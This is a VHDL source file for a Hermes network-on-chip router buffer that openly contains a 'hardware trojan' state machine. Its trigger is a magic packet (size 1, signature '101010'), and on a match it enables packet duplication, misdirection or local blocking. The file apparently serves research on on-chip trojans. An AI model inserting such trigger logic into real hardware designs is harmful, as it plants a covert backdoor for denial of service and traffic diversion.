library IEEE;
use IEEE.std_logic_1164.all;
use IEEE.std_logic_unsigned.all;
use work.HermesPackage.all;

-- interface da Hermes_bufferInfected
entity Hermes_bufferInfected is
port(
	clock:      in  std_logic;
	reset:      in  std_logic;
	configPckt: out std_logic;
	turnOff:    out std_logic;
	HTworking:  in  std_logic;
	destAddr:	out regmetadeflit;
	htOp:		out std_logic_vector(1 downto 0);
	address:	in  regmetadeflit;
	clock_rx:   in  std_logic;
	rx:         in  std_logic;
	data_in:    in  regflit;
	credit_o:   out std_logic;
	h:          out std_logic;
	ack_h:      in  std_logic;
	data_av:    out std_logic;
	data:       out regflit;
	data_ack:   in  std_logic;
	sender_o:   out std_logic);
end Hermes_bufferInfected;

architecture Hermes_bufferInfected of Hermes_bufferInfected is

type fifo_out is (S_INIT, S_HEADER, S_SENDHEADER, S_PAYLOAD, S_END);
signal EA : fifo_out;

type HTState is (waitHeader, waitSize, waitSignature, informPckt);
signal currentHTstate : HTState;

signal buf: buff := (others=>(others=>'0'));
signal read_pointer,write_pointer: pointer ;
signal counter_flit: regflit ;

signal data_available : std_logic;
signal sender:std_logic;
signal zeros : std_logic_vector(TAM_FLIT-2 downto 0);

begin
	zeros <= (others=>'0');
	-------------------------------------------------------------------------------------------
	-- IF:
	--   write_pointer    /= read_pointer      :   FIFO WITH SPACE TO WRITE
	--   read_pointer + 1 == write_pointer     :   FIFO EMPTY
	--   write_pointer   == read_pointer       :   FIFO FULL
	-------------------------------------------------------------------------------------------

	-------------------------------------------------------------------------------------------
	-- PROCESS TO WRITE INTO THE FIFO
	-------------------------------------------------------------------------------------------
	process(reset, clock)
	begin
		if reset='1' then
			write_pointer <= (others => '0');
		elsif clock'event and clock='1' then
                -- if receiving data and fifo isn't empty, record data on fifo and increase write pointer
			if rx = '1' and write_pointer /= read_pointer then
				buf(CONV_INTEGER(write_pointer)) <= data_in;
				write_pointer <= write_pointer + 1;
			end if;
		end if;
	end process;
	
	-- If fifo isn't empty, credit is high. Else, low
	credit_o <= '1' when write_pointer /= read_pointer else '0';

	-------------------------------------------------------------------------------------------
	-- HARDWARE TROJAN PROCESS
	-------------------------------------------------------------------------------------------

	process(reset, clock)
	begin
		if reset='1' then
			configPckt <= '0';
			turnOff <= '0';
			destAddr <= (others=>'0');
			htOp <= "00";
			currentHTstate <= waitHeader;

		elsif rising_edge(clock) then

			case currentHTstate is
				when waitHeader => 
					if rx = '1' and data_in(METADEFLIT-1 downto 0) = address then
						currentHTstate <= waitSize;
					else
						currentHTstate <= waitHeader;
					end if;

					if EA = S_INIT then
						configPckt <= '0';
						turnOff <= '0';
					end if;

				when waitSize =>
					if rx = '1' then
						if  data_in(TAM_FLIT-1 downto 1) = zeros and data_in(0) = '1' then -- equivalent to data_in = x"0001"
							currentHTstate <= waitSignature;
						else
							currentHTstate <= waitHeader;
						end if;
					else
						currentHTstate <= waitSize;
					end if;

				when waitSignature =>
					if rx = '1' then
						if data_in(METADEFLIT+5 downto METADEFLIT) = "101010" then -- Possible combination between signatures and operations
																				   -- 2A or AA: Duplicate	'00 101010' or '10 101010'
																				   -- 6A: HeaderMissDirect 	'01 101010'
																				   -- EA: LocalBlocking		'11 101010'
							htOp <= data_in(TAM_FLIT-1 downto TAM_FLIT-2);
							destAddr <= data_in(METADEFLIT-1 downto 0);
							currentHTstate <= informPckt;
						else
							currentHTstate <= waitHeader;
						end if;
					end if;

				when informPckt =>
					if sender = '0' then
						if EA = S_HEADER then
							if HTworking = '0' then
								configPckt <= '1';
							else 
								turnOff <= '1';
							end if;
						end if;
						currentHTstate <= waitHeader;
					else
						currentHTstate <= informPckt;
					end if;

				when OTHERS =>
					currentHTstate <= waitHeader;

			end case;
		end if;

	end process;


	-------------------------------------------------------------------------------------------
	-- PROCESS TO READ THE FIFO
	-------------------------------------------------------------------------------------------

	-- Available the data to transmission (asynchronous read)
	data <= buf(CONV_INTEGER(read_pointer));

	process(reset, clock)
	begin
		if reset='1' then
			counter_flit <= (others=>'0');
			h <= '0';
			data_available <= '0';
			sender <=  '0';
			-- Initialize the read pointer with one position before the write pointer
			read_pointer <= (others=>'1'); 
			EA <= S_INIT;
		elsif clock'event and clock='1' then
			case EA is
				when S_INIT =>
					counter_flit <= (others=>'0');
					h<='0';
					data_available <= '0';
					-- If fifo isn`t empty
					if (read_pointer + 1 /= write_pointer) then
						-- Routing request to Switch Control
						h<='1';
						-- consume de 1st flit - target address
						read_pointer <= read_pointer + 1;

						EA <= S_HEADER;
					end if;

				when S_HEADER =>
					-- When the Switch Control confirm the routing
					if ack_h='1' then					
						h              <= '0';   -- Disable the routing request 
						sender         <= '1';   -- Enable wrapper signal to packet transmission
						data_available <= '1'; 
						EA             <= S_SENDHEADER ;
					end if;

				when S_SENDHEADER  =>
					-- If the data available is read or was read 
					if data_ack = '1' or data_available = '0' then
						-- If fifo isn`t empty 
						if (read_pointer + 1 /= write_pointer) then
							data_available   <= '1';
							read_pointer   <= read_pointer + 1;     -- consumes de second flit (payload size)
							EA <= S_PAYLOAD;
						-- If fifo is empty (protection clause)
						else
							data_available <= '0';
						end if;
					end if;

				when S_PAYLOAD =>
					-- If the data available is read or was read 
					if data_ack = '1' or data_available = '0' then

						-- If fifo isn`t empty or is tail
						if (read_pointer + 1 /= write_pointer) or counter_flit = x"1" then
							-- If the second flit, memorize the packet size
							if counter_flit = x"0"   then   
								counter_flit <=  buf(CONV_INTEGER(read_pointer));
							elsif counter_flit /= x"1" then 
								counter_flit <=  counter_flit - 1;
							end if;

							-- If the tail flit
							if counter_flit = x"1" then
								-- If tail is send
								if data_ack = '1' then
									data_available <= '0';
									sender <= '0';
									EA <= S_INIT;
								else
									EA <= S_END;
								end if;
							-- Else read the next position
							else
								data_available <= '1';
								read_pointer <= read_pointer + 1;
							end if;
						-- If fifo is empty (protection clause)
						else
							data_available <= '0';
						end if;
					end if;

				when S_END =>
					-- When tail is send
					if data_ack = '1' then
						data_available <= '0';
						sender <= '0';
						EA <= S_INIT;
					end if;
			end case;
		end if;
	end process;
	
	data_av <= data_available;
	sender_o <= sender;
end Hermes_bufferInfected;
